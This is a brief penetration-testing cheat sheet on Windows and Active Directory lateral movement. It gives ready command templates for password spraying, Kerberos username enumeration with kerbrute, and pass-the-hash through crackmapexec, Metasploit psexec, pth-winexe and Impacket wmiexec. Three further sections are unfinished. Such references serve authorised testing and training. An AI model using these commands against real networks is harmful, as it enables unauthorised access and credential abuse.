# Pivoting

## **Password spraying**

* SprayHound
* `crackmapexec smb <IP> -u <FILE>.txt -p '<PWS>'`

## **Kerberos Brute force**

* Find domain username : `./kerbrute_linux_amd64 userenum -d <DOMAIN> --dc <IP> /opt/Selection_Outils/Github/SecLists/Usernames/top-usernames-shortlist.txt`

## **Pass The Hash**

> The PtH vulnerability allow the authentication using only username and password hash without knowing the clear text password. You need to use NTLM hashes, founded in the SAM database of any Windows workstations or the NTDIS database of the domain controller.

* crackmapexec&#x20;
  * `sudo crackmapexec smb <IP> -u '<USERNAME>' -H '<LMHASH:NTHASH>'`
* metasploit&#x20;
  * `use exploit/windows/smb/psexec` then `set SMBPass <LMHASH:NTHASH>`
* pth toolkit&#x20;
  * `pth-winexe -U <DOMAIN>/<USERNAME>%<PASSWORD> //<HOST> <COMMAND>`
* Impacket&#x20;
  * `python wmiexec.py -hashes <LMHASH:NTHASH> <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>`

***



**Pass the ticket**

WiP

***



**OverPass-the-Hash (aka Pass-the-Key)**

WiP

***



**Drop the MIC (CVE-2019-1040)**

WiP
